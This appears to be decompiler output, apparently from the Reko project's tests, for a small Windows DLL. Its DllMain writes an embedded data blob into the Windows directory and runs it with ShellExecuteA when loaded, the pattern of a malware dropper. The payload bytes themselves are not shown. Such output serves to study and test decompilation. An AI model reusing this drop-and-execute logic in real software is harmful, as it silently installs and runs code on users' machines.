// subject_reko_0000000000003000.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

Eq_4 g_t10003000 = 0x4ED7; // 10003000
void g_v10003004 = ??void??; // 10003004
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

CHAR g_t10001000 = '\\'; // 10001000
CHAR g_t1000100D = 'o'; // 1000100D
word32 g_dw10001050 = 0x1090; // 10001050
word32 g_dw10001054 = 4254; // 10001054
word32 g_dw10001058 = 0x10AC; // 10001058
word32 g_dw1000105C = 4292; // 1000105C
word32 g_dw10001060 = 0x10D0; // 10001060
word32 g_dw10001068 = 4330; // 10001068
<anonymous> * __imp__CloseHandle = &g_t1090; // 10001070
<anonymous> * __imp__CreateFileA = &g_t109E; // 10001074
<anonymous> * __imp__GetWindowsDirectoryA = &g_t10AC; // 10001078
<anonymous> * __imp__WriteFile = &g_t10C4; // 1000107C
<anonymous> * __imp__lstrcatA = &g_t10D0; // 10001080
<anonymous> * __imp__ShellExecuteA = &g_t10EA; // 10001088
// 10001110: Register Eq_2 DllMain(Stack Eq_3 hModule, Stack Eq_4 dwReason, Stack Eq_5 lpReserved)
Eq_2 DllMain(Eq_3 hModule, Eq_4 dwReason, Eq_5 lpReserved)
{
	if (dwReason == 0x01)
	{
		GetWindowsDirectoryA(&g_t100011E0, 0x0400);
		lstrcatA(&g_t100011E0, &g_t10001000);
		if (fn10001168(&g_t100011E0) != 0x00)
			ShellExecuteA(null, &g_t1000100D, &g_t100011E0, null, null, 0x00);
	}
	return 0x01;
}

// 10001168: Register word32 fn10001168(Stack Eq_19 dwArg04)
// Called from:
//      DllMain
word32 fn10001168(Eq_19 dwArg04)
{
	Eq_4 tLoc0C;
	word32 ebx_15 = 0x00;
	Eq_3 eax_32 = CreateFileA(dwArg04, 0xC0000000, 0x03, null, 0x02, 0x00, null);
	if (eax_32 != (void *) ~0x00)
	{
		WriteFile(eax_32, &g_v10003004, g_t10003000, &tLoc0C, null);
		CloseHandle(eax_32);
		ebx_15 = 0x01;
	}
	return ebx_15;
}

CHAR g_t100011E0 = '\0'; // 100011E0
